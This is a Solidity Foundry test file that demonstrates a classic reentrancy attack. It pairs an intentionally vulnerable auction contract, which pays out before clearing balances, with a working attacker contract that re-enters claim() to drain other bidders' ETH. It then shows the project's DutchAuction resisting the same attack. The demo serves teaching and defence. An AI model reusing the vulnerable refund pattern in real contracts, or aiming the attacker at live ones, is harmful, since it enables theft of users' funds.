// SPDX-License-Identifier: MIT
pragma solidity 0.8.28;

import {Test, console} from "forge-std/Test.sol";
import {DutchAuction} from "../src/DutchAuction.sol";

/// @notice FOR THE DEMO ONLY. A refund claim written the classic wrong way: no reentrancy
///         guard, and the ETH is sent BEFORE the bidder's balance is cleared. Never deploy this.
/// @dev To keep the demo short, 75% of every bid counts as "excess" to be refunded,
///      like the threshold bid's excess in DutchAuction.
contract VulnerableAuction {
    mapping(address => uint256) public refunds;

    function bid() external payable {
        refunds[msg.sender] += (msg.value * 3) / 4;
    }

    function claim() external {
        uint256 refund = refunds[msg.sender];
        require(refund > 0, "Nothing to claim");
        (bool ok,) = msg.sender.call{value: refund}(""); // BUG 1: pays first...
        require(ok, "send failed");
        refunds[msg.sender] = 0; // BUG 2: ...and clears the balance last. No guard either.
    }
}

/// @notice A malicious bidder: every time it receives ETH, it calls claim() again,
///         as long as the victim still holds enough for another refund.
contract Attacker {
    address public immutable victim;
    uint256 public expectedRefund;
    uint256 public reentries;

    constructor(address victim_) {
        victim = victim_;
    }

    function placeBid() external payable {
        (bool ok,) = victim.call{value: msg.value}(abi.encodeWithSignature("bid()"));
        require(ok, "bid failed");
    }

    function attack(uint256 expectedRefund_) external {
        expectedRefund = expectedRefund_;
        (bool ok,) = victim.call(abi.encodeWithSignature("claim()"));
        require(ok, "claim failed");
    }

    receive() external payable {
        if (victim.balance >= expectedRefund && reentries < 20) {
            reentries++;
            // Re-enter. If the victim blocks it, swallow the error so the first claim survives.
            (bool ok,) = victim.call(abi.encodeWithSignature("claim()"));
            ok; // result intentionally ignored
        }
    }
}

/// @notice Bonus (spec R7): the same attacker against a vulnerable contract and against ours.
///   forge test --match-contract ReentrancyDemo -vv
contract ReentrancyDemoTest is Test {
    address owner = makeAddr("owner");
    address alice = makeAddr("alice");

    function setUp() public {
        vm.deal(alice, 10 ether);
    }

    /// @dev 2_100000000000000000 wei -> "2.100 ETH", for readable logs in the demo video.
    function _eth(uint256 wei_) internal view returns (string memory) {
        uint256 milli = wei_ / 1e15;
        string memory frac = vm.toString(milli % 1000);
        if (milli % 1000 < 10) frac = string.concat("00", frac);
        else if (milli % 1000 < 100) frac = string.concat("0", frac);
        return string.concat(vm.toString(milli / 1000), ".", frac, " ETH");
    }

    function test_Demo1_VulnerableContractIsDrained() public {
        VulnerableAuction victim = new VulnerableAuction();
        vm.prank(alice);
        victim.bid{value: 2 ether}(); // honest bidders' money sits in the contract

        Attacker attacker = new Attacker(address(victim));
        attacker.placeBid{value: 0.2 ether}(); // attacker is owed 0.15 ETH

        console.log("VULNERABLE contract balance before attack:", _eth(address(victim).balance));
        attacker.attack(0.15 ether);
        console.log("VULNERABLE contract balance after attack: ", _eth(address(victim).balance));
        console.log("Attacker was owed 0.150 ETH but received:", _eth(address(attacker).balance));

        assertGt(address(attacker).balance, 0.15 ether * 10); // paid many times over
        assertLt(address(victim).balance, 0.15 ether); // honest bidders' ETH is gone
    }

    function test_Demo2_DutchAuctionBlocksTheSameAttack() public {
        vm.startPrank(owner);
        DutchAuction auction = new DutchAuction("Tulip", "TLP", 1000e18, 0.001 ether, 0.0001 ether);
        auction.start();
        vm.stopPrank();

        vm.prank(alice);
        auction.bid{value: 0.5 ether}(); // honest bidder
        vm.warp(block.timestamp + 10 minutes); // the supply now costs 0.55 ETH

        Attacker attacker = new Attacker(address(auction));
        attacker.placeBid{value: 0.2 ether}(); // sells out the auction; 0.15 ETH is excess
        auction.finalize();
        uint256 owed = auction.thresholdExcess();

        console.log("DutchAuction balance before attack:", _eth(address(auction).balance));
        attacker.attack(owed);
        console.log("DutchAuction balance after attack: ", _eth(address(auction).balance));
        console.log("Attacker was owed:                 ", _eth(owed));
        console.log("Attacker received:                 ", _eth(address(attacker).balance));

        assertEq(attacker.reentries(), 1); // it tried to re-enter
        assertApproxEqAbs(address(attacker).balance, owed, 1); // but was paid exactly once
        vm.prank(alice);
        auction.claim(); // the honest bidder is still paid in full
    }
}
